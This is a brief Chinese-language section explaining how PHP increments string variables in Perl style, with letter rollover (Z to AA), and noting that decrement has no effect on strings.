# 三。自增

在处理字符运算时，php 沿袭了 perl 的语法而不是 c 的，规则:
从最后一个字符按照 ascii 顺序向上进一位，也就是 A–>Z,a–>z，如果是 Z 或 z 字符，再进一位表示多加一个字符。

注意

  1. 注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。
  2. 递增或递减其他字符变量则无效，原字符串没有变化。
